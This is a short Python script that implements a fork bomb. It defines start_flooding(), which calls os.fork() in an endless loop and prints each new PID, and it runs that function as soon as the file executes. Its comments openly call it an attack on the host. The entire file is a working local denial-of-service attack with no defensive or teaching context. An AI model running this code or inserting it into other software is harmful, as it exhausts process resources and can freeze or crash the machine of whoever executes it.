# coding=utf-8


import os


def start_flooding() -> None:
    """
    endless creates pids and loads system
    """

    # start attack
    while True:
        os.fork()  # create random pid proccess
        print("[pid] created: ", {os.getpid()})


# start host attacking
start_flooding()
